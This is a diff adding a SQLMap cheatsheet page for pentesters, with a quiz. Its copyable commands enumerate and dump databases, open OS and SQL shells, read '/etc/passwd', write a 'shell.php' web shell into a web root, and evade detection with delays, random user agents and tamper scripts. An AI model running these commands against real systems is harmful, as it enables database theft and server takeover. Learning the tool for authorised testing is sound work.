@@ -1,0 +1,146 @@
+---
+title: "SQLMap Command Reference"
+date: "2025-06-20"
+tags: ["sqlmap", "sql injection", "pentesting", "database", "enumeration"]
+excerpt: "SQLMap from basic scans to full database takeover — flags, techniques, and real engagement examples."
+type: "cheatsheet"
+category: "Web Security"
+---
+
+SQLMap automates SQL injection detection and exploitation. Every pentester's best friend and every developer's worst nightmare.
+
+<IdeaNode color="pink">**Warning:** SQLMap is loud. Use `--delay` and `--random-agent` on real engagements unless you want the blue team watching you in real time.</IdeaNode>
+
+## Basic Scanning
+
+<Accordion title="sqlmap -u — Basic URL scan" color="#ff2d95">
+```bash
+sqlmap -u "http://example.com/page.php?id=1"
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1"`} label="Copy" />
+</Accordion>
+
+<Accordion title="-p — Target specific parameter" color="#ff2d95">
+```bash
+sqlmap -u "http://example.com/page.php?id=1&cat=2" -p id
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1&cat=2" -p id`} label="Copy" />
+</Accordion>
+
+<Accordion title="POST request with --data" color="#ff2d95">
+```bash
+sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"
+```
+<CopyButton text={`sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"`} label="Copy" />
+</Accordion>
+
+## Database Enumeration
+
+<Accordion title="--dbs — List all databases" color="#0055ff">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --dbs
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --dbs`} label="Copy" />
+</Accordion>
+
+<Accordion title="-D ... --tables — List tables in a database" color="#0055ff">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" -D app_db --tables
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" -D app_db --tables`} label="Copy" />
+</Accordion>
+
+<Accordion title="-T ... --columns — List columns in a table" color="#0055ff">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" -D app_db -T users --columns
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" -D app_db -T users --columns`} label="Copy" />
+</Accordion>
+
+<Accordion title="--dump — Dump table data" color="#0055ff">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" -D app_db -T users --dump
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" -D app_db -T users --dump`} label="Copy" /> Dumps all rows — use `--start 1 --stop 10` to limit
+</Accordion>
+
+## Advanced Techniques
+
+<Accordion title="--dbms — Force database type" color="#ff6600">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql`} label="Copy" />
+</Accordion>
+
+<Accordion title="--os-shell — OS command execution" color="#ff6600">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --os-shell
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --os-shell`} label="Copy" /> Requires stacked queries or out-of-band techniques
+</Accordion>
+
+<Accordion title="--sql-shell — Interactive SQL shell" color="#ff6600">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --sql-shell
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --sql-shell`} label="Copy" />
+</Accordion>
+
+<Accordion title="--file-read / --file-write — File system access" color="#ff6600">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"`} label="Copy read" />
+</Accordion>
+
+## Evasion & Stealth
+
+<Accordion title="--random-agent — Randomize User-Agent" color="#00e5ff">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --random-agent
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --random-agent`} label="Copy" />
+</Accordion>
+
+<Accordion title="--delay — Add delay between requests" color="#00e5ff">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --delay=2
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --delay=2`} label="Copy" />
+</Accordion>
+
+<Accordion title="--tamper — Use tamper scripts" color="#00e5ff">
+```bash
+sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment
+sqlmap -u "http://example.com/page.php?id=1" --tamper=between,randomcase
+```
+<CopyButton text={`sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,between`} label="Copy" />
+</Accordion>
+
+<Accordion title="Request via file (Burp integration)" color="#00e5ff">
+```bash
+sqlmap -r request.txt
+```
+<CopyButton text="sqlmap -r request.txt" label="Copy" /> Save a Burp request to file, feed it directly to SQLMap
+</Accordion>
+
+<QuizCard
+  title="SQLMap Basics"
+  color="#ff2d95"
+  questions={[
+    {
+      question: "Which flag lists all databases on the target?",
+      options: ["--dbs", "--tables", "--dump", "--columns"],
+      correct: 0,
+      explanation: "--dbs enumerates all databases. Use -D <name> --tables to then list tables in a specific database."
+    },
+    {
+      question: "How do you slow down SQLMap to avoid detection?",
+      options: ["--delay=2", "--fast", "--turbo", "--silent"],
+      correct: 0,
+      explanation: "--delay adds seconds between HTTP requests. Combine with --random-agent for basic stealth. --tamper scripts add further evasion."
+    }
+  ]}
+/>
